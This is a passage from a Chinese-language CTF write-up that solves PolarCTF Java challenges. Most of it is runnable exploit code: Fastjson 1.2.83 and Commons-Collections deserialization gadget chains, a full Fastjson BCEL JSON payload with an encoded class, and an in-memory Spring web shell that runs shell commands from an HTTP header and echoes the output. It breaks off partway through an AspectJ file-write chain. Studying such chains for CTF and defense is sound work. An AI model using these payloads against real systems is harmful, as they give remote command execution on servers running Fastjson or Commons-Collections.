                "'_tfactory':{}," +
                "\"_outputProperties\":{}}\n";
        System.out.println(payload);
    }
    public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"C\")};\n" +
                "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                httpresponse.getWriter().write(new String(result));\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }
}
```

直接命令执行读flag：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901171221833.png" alt="image-20240901171221833" style="zoom:50%;" />



### ezJson

源码看一下：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901171735561.png" alt="image-20240901171735561" style="zoom: 67%;" />

再看看依赖：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901171823846.png" alt="image-20240901171823846" style="zoom:67%;" />

看起来能直接打fastjson1.2.83高版本绕过：

```java
package fastjson;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Fastjson83 {
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }

    public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"C\")};\n" +
                "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                httpresponse.getWriter().write(new String(result));\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }

    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception {

        CtClass clz = genPayloadForLinux();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", null);
        return obj;
    }

    public static void main(String[] args) throws Exception{

        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate();

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setFieldValue(bd,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));

//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
//        objectInputStream.readObject();

    }
}
```

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240907203723768.png" alt="image-20240907203723768" style="zoom:50%;" />

打就完了



### CC链

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240907204354994.png" alt="image-20240907204354994" style="zoom:67%;" />

直接打CC链就行了，下边是CC3、CC6和CC2的集合（我直接打CC3或者CC2打不通）：

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC {
    public static void main(String[] args) throws Exception {
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate();
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> innerMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, templates);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "bbb");
        innerMap.remove(templates);
        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(innerMap,invokerTransformer);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));
    }
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }

    public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"C\")};\n" +
                "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                httpresponse.getWriter().write(new String(result));\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }

    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception {

        CtClass clz = genPayloadForLinux();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }
}
```

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240907210550201.png" alt="image-20240907210550201" style="zoom:50%;" />



### FastJsonBCEL

题目都告诉我们怎么打了，再加上这个靶场上的java题不出网，所以直接可以猜到是打FastsjonBCEL的不出网利用链

下载附件看一看：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240916111203131.png" alt="image-20240916111203131" style="zoom:67%;" />

注意这里的反序列化是用的JSONObject.parse()，而之前常见的是JSON.parseObject()这两者的区别需要注意区分

我从网上找了找，几乎没有文章细致的讲这个，那我们就自己分析一下吧：

首先去看看JSONObject，发现里边并没有parse方法，发现是继承的JSON类，原来实际上就是调用的JSON.parse()，而这个和JSON.parseObject()的区别如下：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240916112034385.png" alt="image-20240916112034385" style="zoom:67%;" />

JSON.parseObject()会在调用JSON.parse()之后对解析后的内容进行判断，如果继承自JSONObject则强转为JSONObject后返回，否则toJSON之后强转为JSONObject再返回，这样一来就少了getter的触发

而正常触发getter也要求如下：

| 只存在getter方法，无对应setter方法                           |
| :----------------------------------------------------------- |
| **方法名称长度大于4**                                        |
| **非静态方法**                                               |
| **方法名以get开头，且第四个字符为大写字母**                  |
| **方法不用传入参数**                                         |
| **方法的返回值继承自Collection、Map、AtomicInteger和AtomicLong中的一个** |

总之，getter的触发没了，这就要求我们使用一个fastjson的小trick，那就是把整体当作key，用外边用{ }包裹起来，大致如下：

```json
{{"a":{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassName":"$$BCEL$$"+code,"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"}}}:"b"}
```

这是因为在JSON反序列化的时候，fastjson会对JSON key自动调用toString方法，具体流程在DefaultJSONParse类的parseObject方法中：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240916130348846.png" alt="image-20240916130348846" style="zoom:67%;" />

而JSONObject是Map的子类，因此在调用toString方法时会依次调用该类的getter方法来获取值，因此会调用到BECL链的getConnection方法，故在写payload的时候需要先用@type指定类为JSONObject再进行后续操作

故payload如下：

```json
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A"
        }
    }: "x"
}
```

其中涉及代码如下：

```java
package fastjson;

import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class becl {
    public static void main(String[] args) throws IOException {
        Path path = Paths.get("SpringEcho.class");
        byte[] bytes = Files.readAllBytes(path);
        String code = Utility.encode(bytes,true);
        String s = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",x:{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$"+code+"\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}}:\"x\"}";
        System.out.println(s);
    }
}
```

而回显马直接拿的出题人的[记一次CTF出题之FastjsonBCEL_WP篇 | P0l@R19ht (p0lar1ght.github.io)](https://p0lar1ght.github.io/posts/PolarD&N_CTF_FastjsonBCEL/)，具体如下：

```java
package fastjson;

import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho {
    static {
        try {
            Class v0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method v1 = v0.getMethod("getRequestAttributes");
            Object v2 = v1.invoke(null);
            v0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            v1 = v0.getMethod("getResponse");
            Method v3 = v0.getMethod("getRequest");
            Object v4 = v1.invoke(v2);
            Object v5 = v3.invoke(v2);
            Method v6 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method v7 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader",String.class);
            v7.setAccessible(true);
            v6.setAccessible(true);
            Object v8 = v6.invoke(v4);
            String v9 = (String) v7.invoke(v5,"cmd");
            String[] v10 = new String[3];
            if (System.getProperty("os.name").toUpperCase().contains("WIN")){
                v10[0] = "cmd";
                v10[1] = "/c";
            }else {
                v10[0] = "/bin/sh";
                v10[1] = "-c";
            }
            v10[2] = v9;
            v8.getClass().getDeclaredMethod("println",String.class).invoke(v8,(new Scanner(Runtime.getRuntime().exec(v10).getInputStream())).useDelimiter("\\A").next());
            v8.getClass().getDeclaredMethod("flush").invoke(v8);
            v8.getClass().getDeclaredMethod("clone").invoke(v8);
        } catch (Exception var11) {
            var11.getStackTrace();
        }
    }
}
```

成功命令执行拿到flag:

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240916131531324.png" alt="image-20240916131531324" style="zoom:50%;" />



### 一写一个不吱声

这道题和之前羊城杯的那道有点相似，但脑洞大了许多

先看看题目描述：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005193210039.png" alt="image-20241005193210039" style="zoom:50%;" />

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005195218881.png" alt="image-20241005195218881" style="zoom:50%;" />

说我们要注意$JAVA_HOME，然后反编译后看pom.xml里有对Dockerfile的描述：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005193436735.png" alt="image-20241005193436735" style="zoom: 67%;" />

差不多就是照着他的然后自己拉个docker再echo看看$JAVA_HOME就可以了，看完发现是：`/usr/lib/jvm/java-8-openjdk-amd64/jre`

然后就有点离谱了，clesses，是提示文件夹吗，但最后的文件夹是classes，有点没理解，可能是看下面图中的classes???

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005194025701.png" alt="image-20241005194025701" style="zoom:50%;" />

但这个好像是springboot固定的形式啊，没太懂

先知道要把文件传到`/usr/lib/jvm/java-8-openjdk-amd64/jre/classes`就可以了

之后发现有aspectjweaver依赖，再加上写文件，就知道要用aj链了

然后再去看看controller：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005194613211.png" alt="image-20241005194613211" style="zoom: 67%;" />

上边这个没什么东西，再去看看下边这个：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005194717064.png" alt="image-20241005194717064" style="zoom: 67%;" />

反序列化sink就在这里了

然后我们想想怎么打通，去看看userbean：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005195310313.png" alt="image-20241005195310313" style="zoom:67%;" />

结果发现除了有完整的构造函数，getter，setter外，还有readObject方法，其中的a值得注意，因为最后调用了a的put方法，而aj链的最后，就是利用org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap类的put方法进行的文件写操作：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005195622617.png" alt="image-20241005195622617" style="zoom: 67%;" />

其中的writeToPath方法如下：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005195718392.png" alt="image-20241005195718392" style="zoom:67%;" />

其中，folder决定目录，key决定文件名，bytes决定写入文件的内容

构造函数如下：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20241005195801535.png" alt="image-20241005195801535" style="zoom:67%;" />

因此我们只需要反射调用其构造函数，就可以确定文件的写入位置和内容了

所以说链子很简单，如下所示：

```java
package com.polar.ctf;

import com.polar.ctf.bean.UserBean;

import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class Test {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Constructor con = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap").getDeclaredConstructor(String.class,int.class);
        con.setAccessible(true);
        HashMap map = (HashMap)con.newInstance("/usr/lib/jvm/java-8-openjdk-amd64/jre/classes/",1);
        String name = "Evil1.class";
